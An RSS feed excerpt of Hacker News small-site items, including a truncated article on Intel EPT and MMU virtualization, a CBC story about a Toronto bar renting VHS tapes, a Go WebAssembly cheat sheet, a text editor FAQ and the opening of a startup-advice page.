<p>This article marks the first of 5 articles covering the virtualization of the <a href="https://whatis.techtarget.com/definition/memory-management-unit-MMU"><strong>memory management unit</strong></a> (MMU) using Intel EPT. This technology is used as additional support for the virtualization of physical memory and allows hypervisors to monitor memory activity. In this article, we’ll address the motivation for extended page tables, the many performance concerns associated, and the different architectural components associated with <a href="https://compas.cs.stonybrook.edu%2F~nhonarmand%2Fcourses%2Fsp17%2Fcse506%2Fslides%2fmmu_virtualization.pdf"><strong>MMU virtualization</strong></a>. The components will be covered in some detail, but the majority of information about the various components will be found in the <a href="https://software.intel.com/content/www/us/en/develop/download/intel-64-and-ia-32-architectures-sdm-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html"><strong>Intel SDM</strong></a>. We will not be discussing anything OS-specific in this article – just the architectural details necessary to understand for proper implementation.</p>
<div>
<p><i> </i> <strong>Disclaimer</strong></p>
<p>It’s important that readers should have a foundational knowledge of virtual memory, paging, address translation, and page tables. This can be found in <a href="https://software.intel.com/content/www/us/en/develop/articles/intel-sdm.html"><strong><span><span>§</span></span>4.1.0 V-3A Intel SDM</strong></a>.</p>
</div>
<h2>Memory and the MMU</h2>
<p>In this rundown, we’re going to cover some important concepts as they related to the memory management unit and paging. This is by no means a full discourse on paging and virtual memory for the Intel architecture, but more of an abstract overview to help you connect the dots a little better.</p>
<h4>— Physical and Virtual Memory</h4>
<p><a href="https://en.wikibooks.org/wiki/Operating_System_Design/Physical_Memory"><strong>Physical memory</strong></a> exists on physical cards like DIMM modules and storage devices like hard-disks. If you’re familiar with fundamental concepts in computer science then you may recall that before any process can be executed it must be mapped into physical memory. Now, on modern systems, there is a secondary memory storage space called <a href="https://en.wikibooks.org/wiki/Operating_System_Design/Virtual"><strong>virtual memory</strong></a>. In a perfect world, data required to run programs would be mapped directly into RAM where it can be accessed quickly by the processor. Sadly, we don’t live in a perfect world, and the system’s main memory can become full. Enter stage right, <a href="https://en.wikibooks.org/wiki/Operating_System_Design/Virtual"><strong>virtual memory</strong></a>. The secondary form of memory utilizes a storage device like a hard drive to free up space in physical memory. But, we’re not concerned with virtual memory for the time being. When setting up EPT we need to know some important details about physical memory, first and foremost.</p>
<p>When a computer begins its boot sequence the code executing on the bootstrapping processor is able to access physical memory directly. This is because the processor is operating in what is called <a href="https://en.wikipedia.org/wiki/Real_mode"><strong>real address mode</strong></a> which was aptly named since addresses in <a href="https://en.wikipedia.org/wiki/Real_mode"><strong>real-mode</strong></a> correspond to their physical memory addresses. There is also a number of physical memory ranges available for use by the OS/bootloader, at this point. If we were to breakpoint a system and dump the physical memory ranges present we’d be able to see what’s called the <a href="https://en.wikipedia.org/wiki/Memory_map"><strong>system memory map</strong></a>. I did just that and wanted to explain some of the different things that are relevant to this series. Below is an image of the physical memory ranges when my breakpoint prior to <code>MmInitSystem</code> was hit.</p>
<p><img loading="lazy" src="https://i0.wp.com/revers.engineering/wp-content/uploads/2020/11/windbg_8aRBTuXRKa.png?resize=346%2C164&amp;ssl=1" alt="" width="346" height="164" srcset="https://i0.wp.com/revers.engineering/wp-content/uploads/2020/11/windbg_8aRBTuXRKa.png?w=346&amp;ssl=1 346w, https://i0.wp.com/revers.engineering/wp-content/uploads/2020/11/windbg_8aRBTuXRKa.png?resize=300%2C142&amp;ssl=1 300w" sizes="(max-width: 346px) 100vw, 346px" data-recalc-dims="1"></p>
<p>The image shows the physical memory ranges and their size. The first range from <code>1000h-A0000h</code> is available as general DRAM for OS consumption. This range of memory is also called low-memory – sometimes DOS compatibility memory. So, what’s the purpose of this drivel? Well, during the boot sequence the BIOS does a number of things, but the most relevant thing to this series is applying the different caching behaviors to physical memory ranges. The BIOS programs something called a <a href="https://en.wikipedia.org/wiki/Memory_type_range_register"><strong>memory-type range register</strong></a> (MTRR) to achieve this. These are a set of control registers that give the system control over how specific memory ranges are cached. The details of the caching requirements vary from system to system. For the sake of example, the physical memory range <code>1000h-9FFFFh</code> is typically programmed to be <a href="https://www.geeksforgeeks.org/write-through-and-write-back-in-cache/"><strong>write-back</strong></a>. Whereas the range <code>A0000h-BFFFFh</code> is <strong><a href="https://en.wikipedia.org/wiki/Write_combining">write-combined</a></strong> or <strong><a href="https://groups.google.com/forum/#!msg/microsoft.public.windowsce.embedded/lYFGz_8C3xg/_wVbles8tWEJ">uncached</a></strong>.</p>
<p>If you’re wondering how MTRRs are relevant, don’t worry. We’ll get to that…</p>
<h4><strong><span><span><b>𝛿</b></span></span></strong> Memory Type Range Register (MTRR)</h4>
<p>So, physical memory is divided into ranges and each range has its own cache-control policy applied during system initialization. Why is this important? For starters, applying the proper caching policies to memory regions is vital to ensure that system performance doesn’t go down the toilet. If a frequently accessed region of memory is set to be <a href="https://groups.google.com/forum/#!msg/microsoft.public.windowsce.embedded/lYFGz_8C3xg/_wVbles8tWEJ"><strong>uncached</strong></a> then frequent data fetches will degrade system performance significantly. This would happen because applications typically access data with high measures of locality. If data isn’t present in a cache then the CPU will have to reach out to main memory to acquire it – reaching out to main memory is slow! This is important because when allocating memory and initializing <a href="https://www.anandtech.com/show/2480/10"><strong>EPT</strong></a> we’ll have to build what’s called an <strong><a href="https://www.kernel.org/doc/html/latest/x86/mtrr.html">MTRR map</a></strong>. Fortunately for us, there is already an <a href="https://www.kernel.org/doc/html/latest/x86/mtrr.html"><strong>MTRR map</strong></a> of the current physical memory regions that we can use as a reference.</p>
<p><img loading="lazy" src="https://i0.wp.com/revers.engineering/wp-content/uploads/2020/11/AcroRd32_Z2n3tVLL9m.png?resize=599%2C192&amp;ssl=1" alt="" width="599" height="192" srcset="https://i0.wp.com/revers.engineering/wp-content/uploads/2020/11/AcroRd32_Z2n3tVLL9m.png?w=599&amp;ssl=1 599w, https://i0.wp.com/revers.engineering/wp-content/uploads/2020/11/AcroRd32_Z2n3tVLL9m.png?resize=300%2C96&amp;ssl=1 300w" sizes="(max-width: 599px) 100vw, 599px" data-recalc-dims="1"></p>
<p><span>Figure 0. MTRR encoding table (Intel SDM)</span></p>
<p><img loading="lazy" src="https://i1.wp.com/revers.engineering/wp-content/uploads/2020/11/windbg_Sgn3QpgXBY.png?resize=518%2C302&amp;ssl=1" alt="" width="518" height="302" srcset="https://i1.wp.com/revers.engineering/wp-content/uploads/2020/11/windbg_Sgn3QpgXBY.png?w=518&amp;ssl=1 518w, https://i1.wp.com/revers.engineering/wp-content/uploads/2020/11/windbg_Sgn3QpgXBY.png?resize=300%2C175&amp;ssl=1 300w" sizes="(max-width: 518px) 100vw, 518px" data-recalc-dims="1"></p>
<p><span>Figure 1. MTRR map on physical machine.</span></p>
<p>From the image, you might notice the ranges are quite specific – this is due to Windows using <strong><a href="https://xem.github.io/minix86/manual/intel-x86-and-64-manual-vol3/o_fe12b1e2a880e0ce-435.html">fixed-range MTRRs</a></strong> and some <strong><a href="https://xem.github.io/minix86/manual/intel-x86-and-64-manual-vol3/o_fe12b1e2a880e0ce-434.html">variable-range MTRRs</a></strong>. Armed with this information, it’s clear that applying the appropriate caching policy to our extended page tables during initialization is imperative to preserving system performance. No need to worry either, modifying and creating an <a href="https://wiki.gentoo.org/wiki/MTRR_and_PAT"><strong>MTRR map</strong></a> for our VM is straightforward. We’ll go into more detail in the next article when we build our <strong><a href="https://sites.utexas.edu/jdm4372/tag/mtrr/">MTRR map</a></strong>. See the recommended reading if you’re eager to get ahead. With this addressed, let’s talk about the purpose of the MMU and page tables.</p>
<div>
<p><i> </i> <strong>Page Attribute Table</strong></p>
<p>In addition to MTRRs, there is an additional cache-control called the <strong>Page Attribute Table</strong> (PAT) that is primarily used by the OS to control caching policies at a finer granularity (page level). This cache control is detailed more in the next article.</p>
</div>
<h4>— The MMU</h4>
<p>Most modern processors come with a <a href="https://whatis.techtarget.com/definition/memory-management-unit-MMU"><strong>memory management unit</strong></a> (MMU) implemented which provides access protection and virtual-to-physical address translation. A virtual address is, simply put, an address that software uses; a physical address is an address that hardware outputs on the address lines of the data bus. Intel architectures divide virtual memory into 4KB <a href="https://en.wikipedia.org/wiki/Page_(computer_memory)"><strong>pages</strong></a> (with support for other sizes) and physical memory into 4KB <a href="https://cs.stackexchange.com/questions/11667/what-is-the-difference-between-a-page-of-memory-and-a-frame-of-memory"><strong>frames</strong></a>. An MMU will typically contain a <a href="https://www.sciencedirect.com/topics/computer-science/translation-lookaside-buffer"><strong>translation lookaside buffer</strong></a> (TLB) and will perform operations on the page table such as hardware table walks. Some MMU architectures won’t perform those operations. This is done to give the OS the freedom to implement its page table in whatever manner it desires. The <a href="https://en.wikipedia.org/wiki/Memory_management_unit"><strong>MMU architecture</strong></a> specifies certain caching policies for the instruction and data cache whether identifying code as cacheable or non-cacheable, or write-back and write-through data caching. These policies may also cover caching access rights.</p>
<div>
<p><i> </i> <strong>MMU Split</strong></p>
<p>In certain processors, the MMU can be split into an <strong>Instruction Memory Management Unit</strong> (IMMU) and <strong>Data Memory Management Unit</strong> (DMMU). The first is activated with instruction fetches and the latter with memory operations.</p>
</div>
<p>The MMU architecture for the <a href="https://www.intel.com/content/www/us/en/architecture-and-technology/microarchitecture/intel-64-architecture-general.html"><strong>Intel64 architecture</strong></a> provides a physical address space that covers <span><span>16-EiB</span></span>. However, only 2^57 units are addressable in current architectures with the new page table structure. That’s still ~128-PiB of address space available. The short and “simple” for how an MMU works is this – the MMU gets a virtual address and uses it to index into a table (TLB or page tables.) These entries in the table provide a physical address plus some control signals that may include the caching policy, whether the entry is valid, invalid, protected, and so on. It may also receive signals as to whether the memory referenced by the entry was accessed/modified. If the entry is valid then the virtual address is translated into the physical address; the MMU will then use information from the control signals to determine what type of memory transaction is occurring. These tables mentioned are similar to a directory structure. The MMU will traverse the page tables to translate the virtual address to the physical address. Now on x86-64 architecture, the MMU maps memory through a series of tables – 4 or 5 depending on software requirements.</p>

<p><img loading="lazy" src="https://i2.wp.com/revers.engineering/wp-content/uploads/2020/11/address_translation.png?resize=511%2C294&amp;ssl=1" alt="" width="511" height="294" srcset="https://i2.wp.com/revers.engineering/wp-content/uploads/2020/11/address_translation.png?w=511&amp;ssl=1 511w, https://i2.wp.com/revers.engineering/wp-content/uploads/2020/11/address_translation.png?resize=300%2C173&amp;ssl=1 300w" sizes="(max-width: 511px) 100vw, 511px" data-recalc-dims="1"></p>
<p><span>Figure 1. Simplified diagram of address translation.</span></p>

<p>We’ll cover a bit about TLBs and their role in a virtualization context later. Since we know the purpose of the MMU now let’s talk start talking about Intel’s EPT.</p>
<h2>Extended Page Tables (EPT)</h2>
<p>Intel’s <a href="https://en.wikipedia.org/wiki/Second_Level_Address_Translation"><strong>Extended Page Table</strong></a> (EPT) technology, also referred to as <a href="https://en.wikipedia.org/wiki/Second_Level_Address_Translation"><strong>Secondary Level Address Translation</strong></a> (SLAT), allows a VMM to configure a mapping between the physical memory as it is perceived by the guest and the real physical memory. It’s similar to the virtual page table in that EPT enables the hypervisor to specify <a href="https://www.sciencedirect.com/topics/computer-science/page-table-entry"><strong>access rights</strong></a> for a guest’s physical pages. This allows the hypervisor to generate an event called an EPT violation when a guest attempts to access a page that is either invalid or doesn’t have appropriate access rights. This <a href="https://xem.github.io/minix86/manual/intel-x86-and-64-manual-vol3/o_fe12b1e2a880e0ce-1127.html"><strong>EPT violation</strong></a> is one of the events we’ll be taking advantage of throughout this series since it triggers a VM-exit.</p>
<div>
<p><i> </i> <strong>Important Note</strong></p>
<p>Virtualization of the IOMMU is performed by a complementary technology to EPT called VT-d. This won’t be covered in this series.</p>
</div>
<p>This technology is extraordinarily useful. For instance, one can utilize EPT to protect the hypervisor’s code and data from malicious code attempting to modify it. This would be done by setting the access rights to the VMM’s code and data to read-only. In addition to that, if a VMM were to be used to whitelist certain applications it could modify the access rights of the remaining physical address space to write-only. This would force a VM-exit on any execution to allow the hypervisor to validate the faulting page. Just a fun thought experiment.</p>
<p>Enough about the potential, let’s get into the motivations for EPT and address the other various components associated…</p>
<h4>— Motivation</h4>
<p>One of the main …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://revers.engineering/mmu-ept-technical-details/">https://revers.engineering/mmu-ept-technical-details/</a></em></p>]]>
            </description>
            <link>https://revers.engineering/mmu-ept-technical-details/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25193736</guid>
            <pubDate>Tue, 24 Nov 2020 00:29:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Torontonian is turning his bar into a VHS rental shop]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25193469">thread link</a>) | @sandworm101
<br/>
November 23, 2020 | https://www.cbc.ca/radio/asithappens/as-it-happens-thursday-edition-1.5808547/why-this-torontonian-is-turning-his-bar-into-a-vhs-rental-shop-1.5808550 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/radio/asithappens/as-it-happens-thursday-edition-1.5808547/why-this-torontonian-is-turning-his-bar-into-a-vhs-rental-shop-1.5808550">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Mike Reynolds says people are usually baffled when he tells them he’s transformed his bar into a VHS rental store.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5808578.1605891992!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/mike-reynolds-farside-vhs.jpg"></p></div><figcaption>Farside bar owner Mike Reynolds is leaning in to his lovingly collected trove of old VHS tapes to keep his business going and deliver a bit of the fun people are craving. <!-- --> <!-- -->(Hector Vasquez )</figcaption></figure><p><span><div><div role="button" tabindex="0" title="Why this Torontonian is turning his bar into a VHS rental shop"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/853/223/AsItHappens-podcast-640x360.jpg" alt=""></p><p><span>As It Happens</span><span>0:00</span><span>Why this Torontonian is turning his bar into a VHS rental shop</span></p></div></div></div></span></p><p><span><p><a href="https://www.cbc.ca/radio/asithappens/as-it-happens-thursday-edition-1.5808547/november-19-2020-episode-transcript-1.5810629">Transcript</a></p>  <p>Mike Reynolds says people are usually baffled when he tells them he's transformed his bar into a VHS rental store.</p>  <p>Farside, in Toronto's Chinatown, is renting the tapes&nbsp;alongside its usual pandemic takeout service. You can also rent a VCR with a USB adapter to play them.&nbsp;</p>  <p>"There's a little bit of bewilderment, sort of like, 'Are you seriously doing this?" Reynolds told <em>As It Happens </em>host Carol Off.&nbsp;</p>  <p>"There's also a lot of nostalgia. It's kind of like flooding back. Everyone's asking me what the availability of their favourites are. You know, 'Do you have this movie? Do you have that one?'"</p>  <p>And the answer, he says, is usually yes.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5808582.1605892006!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/farside-horror-movies.jpg 300w,https://i.cbc.ca/1.5808582.1605892006!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/farside-horror-movies.jpg 460w,https://i.cbc.ca/1.5808582.1605892006!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/farside-horror-movies.jpg 620w,https://i.cbc.ca/1.5808582.1605892006!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/farside-horror-movies.jpg 780w,https://i.cbc.ca/1.5808582.1605892006!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/farside-horror-movies.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5808582.1605892006!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/farside-horror-movies.jpg"></p></div><figcaption>A selection of horror VHS tapes available at Farside in Toronto's East Chinatown neighbourhood. <!-- --> <!-- -->(Hector Vasquez)</figcaption></figure></span></p>  <p>Reynolds has spent the last four years amassing a collection of VHS tapes&nbsp;for the bar, which, in pre-COVID days, would always have a video playing in the background on a&nbsp;projector.</p>  <p>Farside has 5,000 tapes on offer, with fan favourites, cult classics and bizarre B-movies that Reynolds has collected&nbsp;by scouring&nbsp;private sales, thrift shops and highway gas station bins.</p>  <p>"It's kind of got a little out of control," said Reynolds, whose pivot to video&nbsp;<a href="https://www.blogto.com/eat_drink/2020/11/toronto-bar-transforming-video-rental-store/"><u>was first reported by BlogTO</u></a>.</p>    <p>He says his oddball collection, which includes '80s G.I. Joe<em> </em>cartoon episodes and at least one of the Ernest movies, is what sets him apart from Netflix and other major streaming services.&nbsp;</p>  <p>"But truth be told, I don't know, man. Like, a lot of these streaming services don't have a lot of the classics, the stuff that I personally want to watch," he said.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5808589.1605814877!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/farside-membership-cards.jpg 300w,https://i.cbc.ca/1.5808589.1605814877!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/farside-membership-cards.jpg 460w,https://i.cbc.ca/1.5808589.1605814877!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/farside-membership-cards.jpg 620w,https://i.cbc.ca/1.5808589.1605814877!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/farside-membership-cards.jpg 780w,https://i.cbc.ca/1.5808589.1605814877!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/farside-membership-cards.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5808589.1605814877!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/farside-membership-cards.jpg"></p></div><figcaption>Farside even has a Blockbuster style membership available to its patrons. <!-- --> <!-- -->(Hector Vasquez )</figcaption></figure></span></p>  <p>Take, for example, the 1974 sci-fi flick <em>Zardoz.</em></p>  <p>"That's a really weird Sean Connery movie that's super hard to find. When I purchased it, I got it off a guy in Kensington Market and his dogs almost ate me alive while I was in his apartment sifting through the tapes," Reynolds said.</p>  <p>"Sean Connery spends most of the movie running around in an orange bikini with a revolver while this stone head vomits guns on him and his fellow tribesmen. It's really strange. It could only be made <a href="https://www.cbc.ca/radio/asithappens/proof-the-70s-was-the-strangest-decade-ever-1.4742848">in the '70s</a>."</p>  <p><span><span><iframe src="https://www.youtube.com/embed/198AApQ9Abo" frameborder="no" title="YouTube content" allowfullscreen=""></iframe></span></span></p>  <hr>  <p>But Reynolds doesn't think he's going to ditch the bar business and single-handedly revive a video rental industry that's largely collapsed around the world.</p>  <p>Instead, he sees the venture as giving his customers another reason to come in and grab some takeout while indoor dining is closed.</p>  <p>"The idea is that you come into the bar and you grab a couple of beers to go and rent something. It kind of gets the same vibe that you would when we were going full throttle," he said.&nbsp;</p>  <p>"It's sort of an incentive for people&nbsp;to still come by and to take a little piece of our home with them."</p>  <hr>  <p><em>Written by Sheena Goodyear. Interview produced by Lisa Bryn Rundle.&nbsp;</em></p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/radio/asithappens/as-it-happens-thursday-edition-1.5808547/why-this-torontonian-is-turning-his-bar-into-a-vhs-rental-shop-1.5808550</link>
            <guid isPermaLink="false">hacker-news-small-sites-25193469</guid>
            <pubDate>Mon, 23 Nov 2020 23:56:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Top Resources for Product Managers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25193345">thread link</a>) | @enigmatic02
<br/>
November 23, 2020 | https://www.sachinrekhi.com/top-resources-for-product-managers | <a href="https://web.archive.org/web/*/https://www.sachinrekhi.com/top-resources-for-product-managers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.sachinrekhi.com/top-resources-for-product-managers</link>
            <guid isPermaLink="false">hacker-news-small-sites-25193345</guid>
            <pubDate>Mon, 23 Nov 2020 23:45:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cheat sheet for using Go everywhere you might use JavaScript]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25193112">thread link</a>) | @azhenley
<br/>
November 23, 2020 | http://alltom.com/pages/goweb/ | <a href="https://web.archive.org/web/*/http://alltom.com/pages/goweb/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><header>
  <a href="http://alltom.com/">← <span>alltom.com</span></a>
</header>







<p>I haven't written straight JavaScript in years. I use <a href="https://golang.org/">Go</a> for everything, including DOM manipulation, integrating with audio libraries and TensorFlow models, and using graphics libraries like <a href="https://threejs.org/">Three.js</a>.

</p><p>This page explains how.

</p><h2>Pros and Cons of Go for web programming</h2>

<p>The good: Go is a great glue language, and most web programming is gluing things together. Even though Go doesn't have a complicated type system, most code I write works the first time. Go compiles to every architecture and platform that I've ever cared about, including web browsers, so I can usually reuse my packages regardless of where the code runs.

</p><p>On the other hand, the syscall/js syntax is annoyingly verbose, particularly when it comes to callbacks, and particularly when those callbacks are used with Promises. I mitigate these issues by isolating usage of syscall/js in shared packages, <a href="https://research.swtch.com/deps#abstract_the_dependency">as you might for any other dependency</a>.

</p><p>The <em>motivation</em> for me to write this article is that I feel very productive writing web sites with Go and I want to share that secret superpower with you. However, the <em>point</em> of writing this article is to make writing Go on the web easy by showing you the hard parts up front. Since I try to illustrate every roadblock with as little code as possible, it might look like Go web development is all roadblocks, but that's not true. Please don't be discouraged! It gets easier as your code base scales.

</p><h2>Scaffolding</h2>



<p>There's one entry point for the server, and one for the code that runs in the browser. It just takes these four files to get off the ground:

</p><ul>
<li>project/server/main.go
</li><li>project/server/public/index.html
</li><li>project/browser/main.go
</li><li>project/browser/generate.go (only needed for convenience)
</li></ul>

<p>Inititalize the project by running <tt>go mod init yourproject</tt> in the project/ directory. <a href="https://blog.golang.org/using-go-modules">This is good Go hygeine these days</a>; it creates a file in your project directory that tracks version numbers and hashes of all your dependencies.

</p><hr>

<h3>project/server/main.go</h3>



<p>Until you add more server-side features, project/server/main.go just serves the static files in the public/ directory:

</p><pre><code>package main

import (
	"flag"
	"net/http"
)

var httpAddress = flag.String("http_address", "localhost:8080", "Address for serving HTTP")

func main() {
	http.Handle("/", http.FileServer(http.Dir("public")))
	http.ListenAndServe(*httpAddress, nil)
}
</code></pre>

<hr>

<h3>project/server/public/index.html</h3>



<p>index.html just needs to invoke the compiled Go code:

</p><pre><code>&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset="utf-8"&gt;
&lt;title&gt;yourproject&lt;/title&gt;

&lt;script src="wasm_exec.js"&gt;&lt;/script&gt;
&lt;script&gt;
if (!WebAssembly.instantiateStreaming) {
	// Polyfill, required for Safari.
	WebAssembly.instantiateStreaming = async (resp, importObject) =&gt; {
		const source = await (await resp).arrayBuffer();
		return await WebAssembly.instantiate(source, importObject);
	};
}

const go = new Go();
WebAssembly.instantiateStreaming(fetch("main.wasm"), go.importObject).then((result) =&gt; {
	go.run(result.instance);
});
&lt;/script&gt;
</code></pre>

<p>The section below about generate.go explains where wasm_exec.js and main.wasm come from.

</p><hr>

<h3>project/browser/main.go</h3>

<p>This is the entry-point for the Go code that runs in the browser, including some examples of how to access global JavaScript objects (which is the same for <tt>document.body</tt> and the rest of the DOM):

</p><pre><code>// +build js,wasm

package main

import (
	"syscall/js"
)

func main() {
	js.Global().Get("console").Call("log", "Hello, World!")

	var cb js.Func
	cb = js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		js.Global().Call("alert", "Hello, World!")
		cb.Release()
		return nil
	})
	js.Global().Call("setTimeout", cb, 2000)

	&lt;-(make(chan bool))
}</code></pre>

<p>I told you the syscall/js syntax was awful.

</p><p>I end with <tt>&lt;-(make(chan bool))</tt> because otherwise, the Go program exits, and any DOM callbacks you've registered (click handlers, timers, etc) that call into Go code will fail.

</p><hr>

<h3>project/browser/generate.go</h3>

<p>index.html refers to two files that you don't write by hand: wasm_exec.js ships with Go, and main.wasm is compiled from project/browser/main.go.

</p>

<p>I put <a href="https://blog.golang.org/generate">go:generate</a> directives in generate.go, which allows you to run <tt>go generate</tt> to put both files into the public/ directory:

</p><pre><code>package main

//go:generate cp $GOROOT/misc/wasm/wasm_exec.js ../server/public/
//go:generate env GOOS=js GOARCH=wasm go build -o ../server/public/main.wasm</code></pre>

<hr>

<h3>Development</h3>

<p>Start the server in one terminal:

</p><pre><code>$ cd project/server/
$ go run main.go</code></pre>



<p>Re-compile the code that runs in the browser whenever you make a change:

</p><pre><code>$ cd project/browser/
$ go generate</code></pre>

<p>View your new, fancy web site by visiting <a href="http://localhost:8080/" target="_blank">http://localhost:8080/</a>

</p><h2>Miscellaneous notes</h2>

<h3><tt>foo == null</tt></h3>

<p>When I wrote JavaScript, I avoided having to care about the difference between JavaScript's <tt>null</tt> and <tt>undefined</tt> by always coercing them to the same value with <tt>==</tt>. For example, <tt>foo == null</tt> is true regardless of whether foo is <tt>null</tt> or <tt>undefined</tt>.

</p><p>That option isn't available with Go's <tt>js.Null()</tt> and <tt>js.Undefined()</tt>, so be prepared to care about the difference, or write a helper.

</p><h3>Promises and async functions</h3>

<p>As you saw above, Go functions that are used as JavaScript callbacks are not automatically garbage-collected and have elaborate syntax. That makes Promises and <tt>async</tt> functions hard to deal with.

</p>

<p>So I use this helper to convert Promises to idiomatic Go return values:

</p><pre><code>func UnwrapPromise(promise js.Value) (js.Value, error) {
	retc := make(chan js.Value)
	errc := make(chan error)

	var release func()
	success := js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		retc &lt;- args[0]
		release()
		return nil
	})
	failure := js.FuncOf(func(this js.Value, args []js.Value) interface{} {
		errc &lt;- fmt.Errorf("%v", args[0])
		release()
		return nil
	})
	release = func() {
		success.Release()
		failure.Release()
	}

	promise.Call("then", success).Call("catch", failure)
	select {
	case ret := &lt;-retc:
		return ret, nil
	case err := &lt;-errc:
		return js.Undefined(), err
	}
}</code></pre>






</div>]]>
            </description>
            <link>http://alltom.com/pages/goweb/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25193112</guid>
            <pubDate>Mon, 23 Nov 2020 23:20:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sudden View – A Direct Manipulation Text Editor]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25193083">thread link</a>) | @JetSpiegel
<br/>
November 23, 2020 | http://www.sudden.net/view/ | <a href="https://web.archive.org/web/*/http://www.sudden.net/view/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div width="440">
        <tbody><tr>
          <td>
      
            <a name="FAQs"></a>
            <h2><strong>
              FAQs - Frequently Asked Questions
              </strong></h2>
            
            <p><strong>
              What are the requirements?</strong><br>
              Sudden View runs under any 32-bit Windows environment with a minimum of VGA
              display. This includes Windows 95, Windows 98, Windows NT, Windows 2000 or Windows XP.
            </p>
            
            <p><strong>
              Why so retro?</strong><br>
              Sudden View's not retro, it's archaic. If it looks like something from out of the 80s,
              that's because it is. I began coding Sudden View in 1989 and began using it
              in 1990. It's first commercial release was in 1992 and it hasn't
              changed much since then. I did the Windows port in 1996 and added the
              ViewBar in 1999. It's been in limited or general release since 1990.
            </p>
            
            <p><strong>
              Does the world really need yet another text editor?</strong><br>
              I think so, mostly because Sudden View is NOT just another text editor.
              As a frustrated writer (one who hasn't been published), I've
              continued to review editing tools over the years. Since I've never
              found anything that allows me to manipulate text as quickly and
              effectively as Sudden View I've continued to use it personally. Plus
              friends and colleagues continue to ask for downloads. I figured since
              I've done the work I might as well make it available to the public.
              YOU decide if it's really needed or not.
            </p>
            
            <p><strong>
              Why the funky font?</strong><br>
              In order to visually manipulate vertical text blocks a mono-spaced font is required.
              Besides, Sudden View is about content, not presentation. The focus is steak over sizzle.
            </p>
            
            <p><strong>
              How do you print from Sudden View?</strong><br>
              You don't. Consider it my contribution to the paperless office.  See the manual
              for more detail (this may change soon).
            </p>
            
            <p><strong>
              Why doesn't Sudden View work like other Windows editors?</strong><br>
              Because if it did, it would be just another Windows editor. Sudden View is a
              way to explore an alternative approach to editing text.
            </p>
            
            <p><strong>
              Is Sudden View free?</strong><br>
              Well, yes, sort of.  Though technically not a free text editor,
              Sudden View is unlimited shareware. It can evaluated indefinitely
              and is not limited in time or features, but it DOES ask you to
              register every now and then.
            </p>

          </td>
         </tr>
       </tbody></div></div>]]>
            </description>
            <link>http://www.sudden.net/view/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25193083</guid>
            <pubDate>Mon, 23 Nov 2020 23:18:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Starting a Startup Starting Now]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25192991">thread link</a>) | @davefreiburger
<br/>
November 23, 2020 | https://gradually.co/what-you-need-to-know-when-you-are-starting-a-startup/ | <a href="https://web.archive.org/web/*/https://gradually.co/what-you-need-to-know-when-you-are-starting-a-startup/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

																					<div>
								<p><a href="https://giphy.com/gifs/spongebob-spongebob-squarepants-season-6-3oKHWmGt1743ofhnHi" target="_blank">
									[Image source: Giphy]								</a></p><h5>
									<a href="https://foundersatwork.posthaven.com/startups-the-very-beginning" target="_blank">
										Startups: The Very Beginning									</a>
									 &nbsp;by Jessica Livingston									<br>
								</h5>
								
								<p>
									Takeaways
								</p>
								<div>
									<p><span>Founders and co-founders alike are the foundation of any startup.&nbsp;</span></p>
<p><span>“You can always change the idea you are working on, but it’s much harder to get rid of a cofounder. So you want to choose cofounders very carefully.” — Jessica Livingston</span></p>
